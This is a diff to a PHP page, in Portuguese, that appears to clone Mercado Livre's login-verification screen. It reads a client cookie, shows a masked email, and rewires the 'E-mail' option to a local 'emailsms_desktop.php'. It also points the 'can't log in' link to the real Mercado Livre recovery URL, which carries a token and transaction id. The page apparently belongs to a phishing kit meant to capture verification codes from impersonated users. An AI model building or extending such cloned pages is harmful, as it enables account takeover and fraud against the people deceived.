@@ -150,7 +150,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
                     <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
                 </a>
                 
-                <a href="#" class="verification-option">
+                <a href="emailsms_desktop.php" class="verification-option">
                     <div class="icon-container"><svg class="channel-icon__shape--filled" width="24" height="14" viewBox="0 0 24 14" fill="currentColor" xmlns="http://www.w3.org/2000/svg" aria-hidden="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.75 0.25H23.25V13.75H0.75V0.25ZM2.25 3.79417V12.25H21.75V3.79417L13.8601 8.30121C12.7074 8.95964 11.2926 8.95964 10.1399 8.30121L2.25 3.79417ZM2.25 2.06669L10.884 6.99874C11.5755 7.39379 12.4245 7.39379 13.116 6.99874L21.75 2.06669V1.75H2.25V2.06669Z"></path></svg></div>
                     <div class="text-content"><h3>E-mail</h3><p>Vamos enviar um código para <?php echo $email_mascarado; ?>.</p></div>
                     <div class="chevron-icon"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></div>
@@ -158,7 +158,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 
                 <div class="final-separator"></div>
                 
-                <a href="#" class="cant-login-link">Não consigo iniciar sessão</a>
+                <a href="https://www.mercadolivre.com.br/account-recovery/landing-page?callback=https%3A%2F%2Fwww.mercadolivre.com%2Fjms%2Fmlb%2Flgz%2Fmsl%2Flogin%2FH4sIAAAAAAAEAzVOzQ6CMAx-l54NEBLFcPRFlgIFGze2bIVpjO9up-HW779vsH7h1cgrEPRAz2B5ZIETBIsy--gMTyo4q1RioQMOxYIRHQnFBP27FC003UhDpWpGm0hNuMndzNZn5X5bynEy9NTcitZkGnamoh6JxSu4i4TU13XOuXIUR5y85T1SNXpXDbGGz0kDSYxEHB_QS9xIx0L5H4X9-n_00l6bpmu7To_zub3C5wuROLBi8gAAAA%2Fsfa_removal%2Fcallback%3Fdps%3Darmor.f99cbbdf68948cce4993e94928b0e23d618f1b67af42faf06e4875e3015735239596f4fbaf7141577ad59edc33b3eceebfbf014a855bcba992688c2f602fcd6b74fb61677037d9c5ff29389350db8f98102c088baf65b4af66e1ad04830eb8a0.04e03a31771a5fd92bda2c6d9032fddb%26rbms%3D&on_hold_delay=24&recovery_type=CHANGE_EMAIL&transaction_id=dXqX8dfCdeiZxWUFEg6mzqf9du19wLGN" class="cant-login-link">Não consigo iniciar sessão</a>
             </div>
         </div>
     </main>
